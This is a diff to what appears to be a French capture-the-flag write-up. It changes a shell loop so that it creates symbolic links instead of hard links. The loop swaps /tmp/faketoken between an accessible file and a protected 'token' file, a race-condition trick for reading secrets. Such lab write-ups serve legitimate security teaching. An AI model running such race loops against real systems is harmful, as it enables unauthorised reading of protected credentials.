@@ -121,9 +121,9 @@ Le premier va venir créer un lien symbolique vers un fichier auquel on a accès
 while :
 do
         rm -f /tmp/faketoken
-        ln /home/user/level10/level10 /tmp/faketoken
+        ln -s /home/user/level10/level10 /tmp/faketoken
         rm -f /tmp/faketoken
-        ln /home/user/level10/token /tmp/faketoken
+        ln -s /home/user/level10/token /tmp/faketoken
 done
 ```
 
